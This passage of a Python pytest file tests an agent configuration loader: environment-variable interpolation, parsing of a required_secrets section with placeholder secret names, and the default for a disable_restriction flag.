        env_vars={"ALPHA": "first", "BETA": "second"},
    )

    assert resolved == {"test_root": {"values": ["first", "literal", "second"]}}

    # Unset detection works for list elements too.
    with pytest.raises(ValueError, match=r"references unset.*\$\{BETA\}"):
        agent_config._interpolate_env_vars(
            data,
            env_vars={"ALPHA": "first"},
        )


# --- SecretsConfig tests ---


def test_secrets_config_defaults():
    cfg = SecretsConfig()
    assert cfg.aer == []
    assert cfg.tools == {}


def test_load_agent_yaml_with_secrets_section(monkeypatch, tmp_path: Path):
    monkeypatch.chdir(tmp_path)
    (tmp_path / "agent.yaml").write_text(
        "\n".join(
            [
                "name: secrets-agent",
                "entrypoint: secrets.main:app",
                "required_secrets:",
                "  aer:",
                "    - SECRET_A",
                "    - SECRET_B",
                "  tools:",
                "    my_tool:",
                "      - SECRET_C",
                "    other_tool:",
                "      - SECRET_A",
            ]
        ),
        encoding="utf-8",
    )

    cfg = load_runtime_agent_config()

    assert cfg.required_secrets.aer == ["SECRET_A", "SECRET_B"]
    assert cfg.required_secrets.tools == {
        "my_tool": ["SECRET_C"],
        "other_tool": ["SECRET_A"],
    }


def test_load_agent_yaml_without_secrets_section(monkeypatch, tmp_path: Path):
    monkeypatch.chdir(tmp_path)
    (tmp_path / "agent.yaml").write_text(
        "\n".join(
            [
                "name: basic-agent",
                "entrypoint: basic.main:app",
            ]
        ),
        encoding="utf-8",
    )

    cfg = load_runtime_agent_config()

    assert cfg.required_secrets.aer == []
    assert cfg.required_secrets.tools == {}
    assert cfg.required_secrets.disable_restriction is False


def test_load_agent_yaml_disable_restriction_true(monkeypatch, tmp_path: Path):
    monkeypatch.chdir(tmp_path)
    (tmp_path / "agent.yaml").write_text(
        "\n".join(
            [
                "name: unrestricted-agent",
                "entrypoint: basic.main:app",
                "required_secrets:",
                "  disable_restriction: true",
                "  aer:",
                "    - SECRET_A",
            ]
        ),
        encoding="utf-8",
    )

    cfg = load_runtime_agent_config()

    assert cfg.required_secrets.disable_restriction is True
    # Declarations stay parsed — turning restriction off doesn't void them.
    assert cfg.required_secrets.aer == ["SECRET_A"]


def test_load_agent_yaml_disable_restriction_false_keeps_restriction(monkeypatch, tmp_path: Path):
    monkeypatch.chdir(tmp_path)
    (tmp_path / "agent.yaml").write_text(
        "\n".join(
            [
                "name: restricted-agent",
                "entrypoint: basic.main:app",
                "required_secrets:",
                "  disable_restriction: false",
            ]
        ),
        encoding="utf-8",
    )

    assert load_runtime_agent_config().required_secrets.disable_restriction is False


def test_load_agent_yaml_disable_restriction_unset_keeps_restriction(monkeypatch, tmp_path: Path):
    monkeypatch.chdir(tmp_path)
    (tmp_path / "agent.yaml").write_text(
        "\n".join(
            [
                "name: default-agent",
                "entrypoint: basic.main:app",
                "required_secrets:",
                "  aer:",
                "    - SECRET_A",
            ]
        ),
        encoding="utf-8",
    )

    cfg = load_runtime_agent_config()

    assert cfg.required_secrets.disable_restriction is False
